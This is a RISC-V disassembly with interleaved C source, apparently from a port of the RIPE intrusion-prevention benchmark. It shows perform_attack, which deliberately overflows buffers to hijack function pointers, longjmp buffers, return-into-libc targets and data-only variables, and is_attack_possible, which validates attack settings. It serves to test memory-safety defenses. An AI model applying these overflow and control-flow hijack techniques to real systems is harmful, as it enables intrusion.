8004306a:	94f42423          	sw	a5,-1720(s0)
                    break;
8004306e:	bb7d                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = bss_jmp_buffer;
80043070:	800477b7          	lui	a5,0x80047
80043074:	dd078793          	addi	a5,a5,-560 # 80046dd0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dd1>
80043078:	94f42423          	sw	a5,-1720(s0)
                    break;
8004307c:	bb45                	j	80042e2c <perform_attack+0x5e6>
                    payload.overflow_ptr = &dop_dest;
8004307e:	800477b7          	lui	a5,0x80047
80043082:	d1c78793          	addi	a5,a5,-740 # 80046d1c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d1d>
80043086:	94f42423          	sw	a5,-1720(s0)
                    break;
8004308a:	b34d                	j	80042e2c <perform_attack+0x5e6>
                        fprintf(stderr,
8004308c:	80046537          	lui	a0,0x80046
80043090:	b3050513          	addi	a0,a0,-1232 # 80045b30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b31>
80043094:	008010ef          	jal	ra,8004409c <printk>
                    exit(1);
80043098:	4505                	li	a0,1
8004309a:	db2fd0ef          	jal	ra,8004064c <exit>
            fprintf(stderr, "Error calculating size of payload\n");
8004309e:	80046537          	lui	a0,0x80046
800430a2:	b9050513          	addi	a0,a0,-1136 # 80045b90 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045b91>
800430a6:	7f7000ef          	jal	ra,8004409c <printk>
        exit(1);
800430aa:	4505                	li	a0,1
800430ac:	da0fd0ef          	jal	ra,8004064c <exit>
            fprintf(stderr, "Error: Could not build payload\n");
800430b0:	80046537          	lui	a0,0x80046
800430b4:	bb450513          	addi	a0,a0,-1100 # 80045bb4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045bb5>
800430b8:	7e5000ef          	jal	ra,8004409c <printk>
        exit(1);
800430bc:	4505                	li	a0,1
800430be:	d8efd0ef          	jal	ra,8004064c <exit>
800430c2:	94442603          	lw	a2,-1724(s0)
800430c6:	167d                	addi	a2,a2,-1
800430c8:	94c42583          	lw	a1,-1716(s0)
800430cc:	97842503          	lw	a0,-1672(s0)
800430d0:	de0fd0ef          	jal	ra,800406b0 <memcpy>
    switch (attack.technique) {
800430d4:	800477b7          	lui	a5,0x80047
800430d8:	f007a783          	lw	a5,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800430dc:	06400713          	li	a4,100
800430e0:	02e78c63          	beq	a5,a4,80043118 <perform_attack+0x8d2>
800430e4:	06500713          	li	a4,101
800430e8:	1ee79263          	bne	a5,a4,800432cc <perform_attack+0xa86>
            if (attack.function == SSCANF) {
800430ec:	800477b7          	lui	a5,0x80047
800430f0:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800430f4:	4b98                	lw	a4,16(a5)
800430f6:	1fb00793          	li	a5,507
800430fa:	10f70063          	beq	a4,a5,800431fa <perform_attack+0x9b4>
            if (attack.inject_param == RETURN_INTO_LIBC) {
800430fe:	800477b7          	lui	a5,0x80047
80043102:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043106:	43dc                	lw	a5,4(a5)
80043108:	0c900713          	li	a4,201
8004310c:	0ee78e63          	beq	a5,a4,80043208 <perform_attack+0x9c2>
            } else if (attack.inject_param == INJECTED_CODE_NO_NOP) {
80043110:	0c800713          	li	a4,200
80043114:	1ae78563          	beq	a5,a4,800432be <perform_attack+0xa78>
    printf("");
80043118:	80046537          	lui	a0,0x80046
8004311c:	f4850513          	addi	a0,a0,-184 # 80045f48 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045f49>
80043120:	77d000ef          	jal	ra,8004409c <printk>
    printf("\nExecuting attack... ");
80043124:	80046537          	lui	a0,0x80046
80043128:	c4850513          	addi	a0,a0,-952 # 80045c48 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045c49>
8004312c:	771000ef          	jal	ra,8004409c <printk>
    switch (attack.code_ptr) {
80043130:	800477b7          	lui	a5,0x80047
80043134:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043138:	479c                	lw	a5,8(a5)
8004313a:	ed378793          	addi	a5,a5,-301
8004313e:	4741                	li	a4,16
80043140:	1af76363          	bltu	a4,a5,800432e6 <perform_attack+0xaa0>
80043144:	078a                	slli	a5,a5,0x2
80043146:	80045737          	lui	a4,0x80045
8004314a:	4a070713          	addi	a4,a4,1184 # 800454a0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800454a1>
8004314e:	97ba                	add	a5,a5,a4
80043150:	439c                	lw	a5,0(a5)
80043152:	8782                	jr	a5
__ssp_bos_icheck2_restrict(stpcpy, char *, const char *)
#if __GNUC_PREREQ__(4,8) || defined(__clang__)
__ssp_bos_icheck3_restrict(stpncpy, char *, const char *)
#endif
__ssp_bos_icheck2_restrict(strcpy, char *, const char *)
80043154:	94c42583          	lw	a1,-1716(s0)
80043158:	97842503          	lw	a0,-1672(s0)
8004315c:	d9dfd0ef          	jal	ra,80040ef8 <strcpy>
80043160:	bf95                	j	800430d4 <perform_attack+0x88e>
__ssp_bos_icheck2_restrict(strcat, char *, const char *)
__ssp_bos_icheck3_restrict(strncpy, char *, const char *)
80043162:	94442603          	lw	a2,-1724(s0)
80043166:	94c42583          	lw	a1,-1716(s0)
8004316a:	97842503          	lw	a0,-1672(s0)
8004316e:	ecffd0ef          	jal	ra,8004103c <strncpy>
80043172:	b78d                	j	800430d4 <perform_attack+0x88e>
            sprintf(buffer, "%s", payload.buffer);
80043174:	94c42583          	lw	a1,-1716(s0)
80043178:	97842503          	lw	a0,-1672(s0)
8004317c:	d7dfd0ef          	jal	ra,80040ef8 <strcpy>
80043180:	bf91                	j	800430d4 <perform_attack+0x88e>
            snprintf(buffer, payload.size, "%s", payload.buffer);
80043182:	94c42683          	lw	a3,-1716(s0)
80043186:	80046637          	lui	a2,0x80046
8004318a:	bd460613          	addi	a2,a2,-1068 # 80045bd4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045bd5>
8004318e:	94442583          	lw	a1,-1724(s0)
80043192:	97842503          	lw	a0,-1672(s0)
80043196:	aabfd0ef          	jal	ra,80040c40 <sniprintf>
8004319a:	bf2d                	j	800430d4 <perform_attack+0x88e>
__ssp_bos_icheck2_restrict(strcat, char *, const char *)
8004319c:	94c42583          	lw	a1,-1716(s0)
800431a0:	97842503          	lw	a0,-1672(s0)
800431a4:	b55fd0ef          	jal	ra,80040cf8 <strcat>
800431a8:	b735                	j	800430d4 <perform_attack+0x88e>
__ssp_bos_icheck3_restrict(strncat, char *, const char *)
800431aa:	94442603          	lw	a2,-1724(s0)
800431ae:	94c42583          	lw	a1,-1716(s0)
800431b2:	97842503          	lw	a0,-1672(s0)
800431b6:	ddffd0ef          	jal	ra,80040f94 <strncat>
800431ba:	bf29                	j	800430d4 <perform_attack+0x88e>
            snprintf(format_string_buf, 15, "%%%ic", payload.size);
800431bc:	94442683          	lw	a3,-1724(s0)
800431c0:	80046637          	lui	a2,0x80046
800431c4:	bd860613          	addi	a2,a2,-1064 # 80045bd8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045bd9>
800431c8:	45bd                	li	a1,15
800431ca:	96840513          	addi	a0,s0,-1688
800431ce:	a73fd0ef          	jal	ra,80040c40 <sniprintf>
800431d2:	b709                	j	800430d4 <perform_attack+0x88e>
            homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
800431d4:	94442603          	lw	a2,-1724(s0)
800431d8:	167d                	addi	a2,a2,-1
800431da:	94c42583          	lw	a1,-1716(s0)
800431de:	97842503          	lw	a0,-1672(s0)
800431e2:	afaff0ef          	jal	ra,800424dc <homebrew_memcpy>
800431e6:	b5fd                	j	800430d4 <perform_attack+0x88e>
                fprintf(stderr, "Error: Unknown choice of function\n");
800431e8:	80046537          	lui	a0,0x80046
800431ec:	be050513          	addi	a0,a0,-1056 # 80045be0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045be1>
800431f0:	6ad000ef          	jal	ra,8004409c <printk>
            exit(1);
800431f4:	4505                	li	a0,1
800431f6:	c56fd0ef          	jal	ra,8004064c <exit>
                *(uint32_t *) target_addr <<= 8;
800431fa:	93042703          	lw	a4,-1744(s0)
800431fe:	431c                	lw	a5,0(a4)
80043200:	07a2                	slli	a5,a5,0x8
                *(uint32_t *) target_addr >>= 8;
80043202:	83a1                	srli	a5,a5,0x8
80043204:	c31c                	sw	a5,0(a4)
80043206:	bde5                	j	800430fe <perform_attack+0x8b8>
                payload.overflow_ptr = &ret2libc_target;
80043208:	800427b7          	lui	a5,0x80042
8004320c:	2f478793          	addi	a5,a5,756 # 800422f4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422f5>
80043210:	94f42423          	sw	a5,-1720(s0)
                  - (uintptr_t) buffer + sizeof(long) + 1;
80043214:	97842783          	lw	a5,-1672(s0)
80043218:	92442483          	lw	s1,-1756(s0)
8004321c:	40f487b3          	sub	a5,s1,a5
80043220:	0795                	addi	a5,a5,5
                payload.size         = (uintptr_t) target_addr_aux
80043222:	94f42223          	sw	a5,-1724(s0)
                build_payload(&payload);
80043226:	94040513          	addi	a0,s0,-1728
8004322a:	93eff0ef          	jal	ra,80042368 <build_payload>
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
8004322e:	94442603          	lw	a2,-1724(s0)
80043232:	167d                	addi	a2,a2,-1
80043234:	94c42583          	lw	a1,-1716(s0)
80043238:	97842503          	lw	a0,-1672(s0)
8004323c:	c74fd0ef          	jal	ra,800406b0 <memcpy>
                printf("target_addr_aux: %p\n", target_addr_aux);
80043240:	85a6                	mv	a1,s1
80043242:	80046537          	lui	a0,0x80046
80043246:	c0450513          	addi	a0,a0,-1020 # 80045c04 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045c05>
8004324a:	653000ef          	jal	ra,8004409c <printk>
                switch (attack.location) {
8004324e:	800477b7          	lui	a5,0x80047
80043252:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043256:	47dc                	lw	a5,12(a5)
80043258:	19100713          	li	a4,401
8004325c:	04e78063          	beq	a5,a4,8004329c <perform_attack+0xa56>
80043260:	02f77363          	bgeu	a4,a5,80043286 <perform_attack+0xa40>
80043264:	19200713          	li	a4,402
80043268:	04e78263          	beq	a5,a4,800432ac <perform_attack+0xa66>
8004326c:	19300713          	li	a4,403
80043270:	eae794e3          	bne	a5,a4,80043118 <perform_attack+0x8d2>
                          (uintptr_t) *data_mem_ptr_aux;
80043274:	800477b7          	lui	a5,0x80047
80043278:	ae87a703          	lw	a4,-1304(a5) # 80046ae8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046ae9>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
8004327c:	93042783          	lw	a5,-1744(s0)
80043280:	439c                	lw	a5,0(a5)
80043282:	c398                	sw	a4,0(a5)
                        break;
80043284:	bd51                	j	80043118 <perform_attack+0x8d2>
80043286:	19000713          	li	a4,400
8004328a:	e8e797e3          	bne	a5,a4,80043118 <perform_attack+0x8d2>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
8004328e:	93042783          	lw	a5,-1744(s0)
80043292:	439c                	lw	a5,0(a5)
                          (uintptr_t) stack_mem_ptr_aux;
80043294:	ea442703          	lw	a4,-348(s0)
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80043298:	c398                	sw	a4,0(a5)
                        break;
8004329a:	bdbd                	j	80043118 <perform_attack+0x8d2>
                          (uintptr_t) *heap_mem_ptr_aux;
8004329c:	91c42783          	lw	a5,-1764(s0)
800432a0:	4398                	lw	a4,0(a5)
                        *(uint32_t *) (*(uint32_t *) target_addr) =
800432a2:	93042783          	lw	a5,-1744(s0)
800432a6:	439c                	lw	a5,0(a5)
800432a8:	c398                	sw	a4,0(a5)
                        break;
800432aa:	b5bd                	j	80043118 <perform_attack+0x8d2>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
800432ac:	93042783          	lw	a5,-1744(s0)
800432b0:	439c                	lw	a5,0(a5)
                          (uintptr_t) bss_mem_ptr_aux;
800432b2:	80047737          	lui	a4,0x80047
800432b6:	dac72703          	lw	a4,-596(a4) # 80046dac <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dad>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
800432ba:	c398                	sw	a4,0(a5)
                        break;
800432bc:	bdb1                	j	80043118 <perform_attack+0x8d2>
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
800432be:	93042783          	lw	a5,-1744(s0)
800432c2:	439c                	lw	a5,0(a5)
                  (uintptr_t) buffer;
800432c4:	97842703          	lw	a4,-1672(s0)
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
800432c8:	c398                	sw	a4,0(a5)
800432ca:	b5b9                	j	80043118 <perform_attack+0x8d2>
                fprintf(stderr, "Error: Unknown choice of attack parameterB\n");
800432cc:	80046537          	lui	a0,0x80046
800432d0:	c1c50513          	addi	a0,a0,-996 # 80045c1c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045c1d>
800432d4:	5c9000ef          	jal	ra,8004409c <printk>
            exit(1);
800432d8:	4505                	li	a0,1
800432da:	b72fd0ef          	jal	ra,8004064c <exit>
            stack_func_ptr(NULL);
800432de:	4501                	li	a0,0
800432e0:	eac42783          	lw	a5,-340(s0)
800432e4:	9782                	jalr	a5
} /* perform_attack */
800432e6:	6ec12083          	lw	ra,1772(sp)
800432ea:	6e812403          	lw	s0,1768(sp)
800432ee:	6e412483          	lw	s1,1764(sp)
800432f2:	6e012903          	lw	s2,1760(sp)
800432f6:	6dc12983          	lw	s3,1756(sp)
800432fa:	6d812a03          	lw	s4,1752(sp)
800432fe:	6f010113          	addi	sp,sp,1776
80043302:	8082                	ret
            ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
80043304:	4581                	li	a1,0
80043306:	4501                	li	a0,0
80043308:	93c42783          	lw	a5,-1732(s0)
8004330c:	9782                	jalr	a5
8004330e:	bfe1                	j	800432e6 <perform_attack+0xaa0>
            ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
80043310:	93442783          	lw	a5,-1740(s0)
80043314:	439c                	lw	a5,0(a5)
80043316:	4581                	li	a1,0
80043318:	4501                	li	a0,0
8004331a:	9782                	jalr	a5
8004331c:	b7e9                	j	800432e6 <perform_attack+0xaa0>
            ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
8004331e:	800477b7          	lui	a5,0x80047
80043322:	da47a783          	lw	a5,-604(a5) # 80046da4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da5>
80043326:	4581                	li	a1,0
80043328:	4501                	li	a0,0
8004332a:	9782                	jalr	a5
8004332c:	bf6d                	j	800432e6 <perform_attack+0xaa0>
            ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
8004332e:	800477b7          	lui	a5,0x80047
80043332:	d187a783          	lw	a5,-744(a5) # 80046d18 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d19>
80043336:	4581                	li	a1,0
80043338:	4501                	li	a0,0
8004333a:	9782                	jalr	a5
8004333c:	b76d                	j	800432e6 <perform_attack+0xaa0>
            lj_func(stack_jmp_buffer);
8004333e:	eb040513          	addi	a0,s0,-336
80043342:	98eff0ef          	jal	ra,800424d0 <lj_func>
            lj_func(stack_jmp_buffer_param);
80043346:	93842503          	lw	a0,-1736(s0)
8004334a:	986ff0ef          	jal	ra,800424d0 <lj_func>
            lj_func(*heap_jmp_buffer);
8004334e:	92842503          	lw	a0,-1752(s0)
80043352:	97eff0ef          	jal	ra,800424d0 <lj_func>
            lj_func(data_jmp_buffer);
80043356:	80046537          	lui	a0,0x80046
8004335a:	77850513          	addi	a0,a0,1912 # 80046778 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046779>
8004335e:	972ff0ef          	jal	ra,800424d0 <lj_func>
            lj_func(bss_jmp_buffer);
80043362:	80047537          	lui	a0,0x80047
80043366:	dd050513          	addi	a0,a0,-560 # 80046dd0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dd1>
8004336a:	966ff0ef          	jal	ra,800424d0 <lj_func>
            ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
8004336e:	4581                	li	a1,0
80043370:	4501                	li	a0,0
80043372:	a7c42783          	lw	a5,-1412(s0)
80043376:	9782                	jalr	a5
80043378:	b7bd                	j	800432e6 <perform_attack+0xaa0>
            (*heap_struct->func_ptr)(NULL, 0);
8004337a:	92c42783          	lw	a5,-1748(s0)
8004337e:	1007a783          	lw	a5,256(a5)
80043382:	4581                	li	a1,0
80043384:	4501                	li	a0,0
80043386:	9782                	jalr	a5
80043388:	bfb9                	j	800432e6 <perform_attack+0xaa0>
            (*data_struct.func_ptr)(NULL, 0);
8004338a:	800477b7          	lui	a5,0x80047
8004338e:	c0878793          	addi	a5,a5,-1016 # 80046c08 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046c09>
80043392:	1007a783          	lw	a5,256(a5)
80043396:	4581                	li	a1,0
80043398:	4501                	li	a0,0
8004339a:	9782                	jalr	a5
8004339c:	b7a9                	j	800432e6 <perform_attack+0xaa0>
            (*bss_struct.func_ptr)(NULL, 0);
8004339e:	800477b7          	lui	a5,0x80047
800433a2:	03478793          	addi	a5,a5,52 # 80047034 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047035>
800433a6:	1007a783          	lw	a5,256(a5)
800433aa:	4581                	li	a1,0
800433ac:	4501                	li	a0,0
800433ae:	9782                	jalr	a5
800433b0:	bf1d                	j	800432e6 <perform_attack+0xaa0>
            switch (attack.location) {
800433b2:	800477b7          	lui	a5,0x80047
800433b6:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800433ba:	47dc                	lw	a5,12(a5)
800433bc:	19100713          	li	a4,401
800433c0:	04e78263          	beq	a5,a4,80043404 <perform_attack+0xbbe>
800433c4:	02f77463          	bgeu	a4,a5,800433ec <perform_attack+0xba6>
800433c8:	19200713          	li	a4,402
800433cc:	04e78463          	beq	a5,a4,80043414 <perform_attack+0xbce>
800433d0:	19300713          	li	a4,403
800433d4:	f0e799e3          	bne	a5,a4,800432e6 <perform_attack+0xaa0>
                    dop_target(buffer, **data_mem_ptr);
800433d8:	800477b7          	lui	a5,0x80047
800433dc:	9e87a783          	lw	a5,-1560(a5) # 800469e8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800469e9>
800433e0:	438c                	lw	a1,0(a5)
800433e2:	97842503          	lw	a0,-1672(s0)
800433e6:	96cff0ef          	jal	ra,80042552 <dop_target>
800433ea:	bdf5                	j	800432e6 <perform_attack+0xaa0>
800433ec:	19000713          	li	a4,400
800433f0:	eee79be3          	bne	a5,a4,800432e6 <perform_attack+0xaa0>
                    dop_target(buffer, *stack_mem_ptr);
800433f4:	ea842783          	lw	a5,-344(s0)
800433f8:	438c                	lw	a1,0(a5)
800433fa:	97842503          	lw	a0,-1672(s0)
800433fe:	954ff0ef          	jal	ra,80042552 <dop_target>
80043402:	b5d5                	j	800432e6 <perform_attack+0xaa0>
                    dop_target(buffer, *heap_mem_ptr);
80043404:	92042783          	lw	a5,-1760(s0)
80043408:	438c                	lw	a1,0(a5)
8004340a:	97842503          	lw	a0,-1672(s0)
8004340e:	944ff0ef          	jal	ra,80042552 <dop_target>
80043412:	bdd1                	j	800432e6 <perform_attack+0xaa0>
                    dop_target(buffer, *bss_mem_ptr);
80043414:	800477b7          	lui	a5,0x80047
80043418:	da87a783          	lw	a5,-600(a5) # 80046da8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046da9>
8004341c:	438c                	lw	a1,0(a5)
8004341e:	97842503          	lw	a0,-1672(s0)
80043422:	930ff0ef          	jal	ra,80042552 <dop_target>
80043426:	b5c1                	j	800432e6 <perform_attack+0xaa0>
			data_leak(buffer);
80043428:	97842503          	lw	a0,-1672(s0)
8004342c:	96cff0ef          	jal	ra,80042598 <data_leak>
80043430:	bd5d                	j	800432e6 <perform_attack+0xaa0>

80043432 <is_attack_possible>:

boolean
is_attack_possible()
{
80043432:	1141                	addi	sp,sp,-16
80043434:	c606                	sw	ra,12(sp)
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
80043436:	800477b7          	lui	a5,0x80047
8004343a:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004343e:	43dc                	lw	a5,4(a5)
80043440:	0c800713          	li	a4,200
80043444:	06e78163          	beq	a5,a4,800434a6 <is_attack_possible+0x74>
        fprintf(stderr,
          "Error: Impossible to inject shellcode with string functions (for now)\n");
        return FALSE;
    }

    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
80043448:	0ca00713          	li	a4,202
8004344c:	08e78263          	beq	a5,a4,800434d0 <is_attack_possible+0x9e>
        fprintf(stderr,
          "Error: Impossible (theoretically) to perform indirect ROP attacks\n");
        return FALSE;
    }

    if (attack.inject_param == DATA_ONLY) {
80043450:	0cb00713          	li	a4,203
80043454:	08e78e63          	beq	a5,a4,800434f0 <is_attack_possible+0xbe>
        if (attack.location == HEAP && attack.technique == INDIRECT) {
            fprintf(stderr,
              "Error: Impossible to indirect attack the heap flag.\n");
        	return FALSE;
		}
    } else if (attack.code_ptr == VAR_BOF ||
80043458:	800477b7          	lui	a5,0x80047
8004345c:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043460:	479c                	lw	a5,8(a5)
			   attack.code_ptr == VAR_IOF ||
80043462:	ec578793          	addi	a5,a5,-315
    } else if (attack.code_ptr == VAR_BOF ||
80043466:	4709                	li	a4,2
80043468:	10f77463          	bgeu	a4,a5,80043570 <is_attack_possible+0x13e>
          "Error: Must use \"dataonly\" injection parameter for DOP attacks.\n");
    	return FALSE;
	}

    // JM: attacks targeting another memory location must be indirect
    switch (attack.location) {
8004346c:	800477b7          	lui	a5,0x80047
80043470:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043474:	47dc                	lw	a5,12(a5)
80043476:	19100713          	li	a4,401
8004347a:	1ce78363          	beq	a5,a4,80043640 <is_attack_possible+0x20e>
8004347e:	10f77163          	bgeu	a4,a5,80043580 <is_attack_possible+0x14e>
80043482:	19200713          	li	a4,402
80043486:	2ae78763          	beq	a5,a4,80043734 <is_attack_possible+0x302>
8004348a:	19300713          	li	a4,403
8004348e:	10e79b63          	bne	a5,a4,800435a4 <is_attack_possible+0x172>
                return FALSE;
            }
            break;

        case DATA:
            if ((attack.technique == DIRECT) &&
80043492:	800477b7          	lui	a5,0x80047
80043496:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004349a:	06400793          	li	a5,100
8004349e:	22f70363          	beq	a4,a5,800436c4 <is_attack_possible+0x292>
                return FALSE;
            }
            break;
    }

    return TRUE;
800434a2:	4505                	li	a0,1
800434a4:	a8ed                	j	8004359e <is_attack_possible+0x16c>
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
800434a6:	80047737          	lui	a4,0x80047
800434aa:	f0070713          	addi	a4,a4,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800434ae:	4b18                	lw	a4,16(a4)
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
800434b0:	1f400693          	li	a3,500
800434b4:	f8d70ae3          	beq	a4,a3,80043448 <is_attack_possible+0x16>
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
800434b8:	1fc00693          	li	a3,508
800434bc:	f8d706e3          	beq	a4,a3,80043448 <is_attack_possible+0x16>
        fprintf(stderr,
800434c0:	80045537          	lui	a0,0x80045
800434c4:	66050513          	addi	a0,a0,1632 # 80045660 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045661>
800434c8:	3d5000ef          	jal	ra,8004409c <printk>
        return FALSE;
800434cc:	4501                	li	a0,0
800434ce:	a8c1                	j	8004359e <is_attack_possible+0x16c>
      attack.technique != DIRECT)
800434d0:	80047737          	lui	a4,0x80047
800434d4:	f0072683          	lw	a3,-256(a4) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
800434d8:	06400713          	li	a4,100
800434dc:	f6e68ae3          	beq	a3,a4,80043450 <is_attack_possible+0x1e>
        fprintf(stderr,
800434e0:	80045537          	lui	a0,0x80045
800434e4:	6a850513          	addi	a0,a0,1704 # 800456a8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800456a9>
800434e8:	3b5000ef          	jal	ra,8004409c <printk>
        return FALSE;
800434ec:	4501                	li	a0,0
800434ee:	a845                	j	8004359e <is_attack_possible+0x16c>
        if (attack.code_ptr != VAR_BOF &&
800434f0:	800477b7          	lui	a5,0x80047
800434f4:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800434f8:	479c                	lw	a5,8(a5)
          	attack.code_ptr != VAR_IOF &&
800434fa:	ec578693          	addi	a3,a5,-315
        if (attack.code_ptr != VAR_BOF &&
800434fe:	4709                	li	a4,2
80043500:	04d76063          	bltu	a4,a3,80043540 <is_attack_possible+0x10e>
        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
80043504:	ec478793          	addi	a5,a5,-316
80043508:	4705                	li	a4,1
8004350a:	04f77363          	bgeu	a4,a5,80043550 <is_attack_possible+0x11e>
        if (attack.location == HEAP && attack.technique == INDIRECT) {
8004350e:	800477b7          	lui	a5,0x80047
80043512:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043516:	47d8                	lw	a4,12(a5)
80043518:	19100793          	li	a5,401
8004351c:	f4f718e3          	bne	a4,a5,8004346c <is_attack_possible+0x3a>
80043520:	800477b7          	lui	a5,0x80047
80043524:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043528:	06500793          	li	a5,101
8004352c:	f4f710e3          	bne	a4,a5,8004346c <is_attack_possible+0x3a>
            fprintf(stderr,
80043530:	80045537          	lui	a0,0x80045
80043534:	75850513          	addi	a0,a0,1880 # 80045758 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045759>
80043538:	365000ef          	jal	ra,8004409c <printk>
        	return FALSE;
8004353c:	4501                	li	a0,0
8004353e:	a085                	j	8004359e <is_attack_possible+0x16c>
            fprintf(stderr, "Error: Misused DOP code pointer parameters.\n");
80043540:	80045537          	lui	a0,0x80045
80043544:	6ec50513          	addi	a0,a0,1772 # 800456ec <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800456ed>
80043548:	355000ef          	jal	ra,8004409c <printk>
			return FALSE;
8004354c:	4501                	li	a0,0
8004354e:	a881                	j	8004359e <is_attack_possible+0x16c>
        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
80043550:	800477b7          	lui	a5,0x80047
80043554:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043558:	06500793          	li	a5,101
8004355c:	faf719e3          	bne	a4,a5,8004350e <is_attack_possible+0xdc>
            fprintf(stderr,
80043560:	80045537          	lui	a0,0x80045
80043564:	71c50513          	addi	a0,a0,1820 # 8004571c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004571d>
80043568:	335000ef          	jal	ra,8004409c <printk>
			return FALSE;
8004356c:	4501                	li	a0,0
8004356e:	a805                	j	8004359e <is_attack_possible+0x16c>
        fprintf(stderr,
80043570:	80045537          	lui	a0,0x80045
80043574:	79050513          	addi	a0,a0,1936 # 80045790 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045791>
80043578:	325000ef          	jal	ra,8004409c <printk>
    	return FALSE;
8004357c:	4501                	li	a0,0
8004357e:	a005                	j	8004359e <is_attack_possible+0x16c>
    switch (attack.location) {
80043580:	19000713          	li	a4,400
80043584:	00e79c63          	bne	a5,a4,8004359c <is_attack_possible+0x16a>
            if ((attack.technique == DIRECT)) {
80043588:	800477b7          	lui	a5,0x80047
8004358c:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80043590:	06400793          	li	a5,100
80043594:	00f70a63          	beq	a4,a5,800435a8 <is_attack_possible+0x176>
    return TRUE;
80043598:	4505                	li	a0,1
8004359a:	a011                	j	8004359e <is_attack_possible+0x16c>
8004359c:	4505                	li	a0,1
} /* is_attack_possible */
8004359e:	40b2                	lw	ra,12(sp)
800435a0:	0141                	addi	sp,sp,16
800435a2:	8082                	ret
    return TRUE;
800435a4:	4505                	li	a0,1
800435a6:	bfe5                	j	8004359e <is_attack_possible+0x16c>
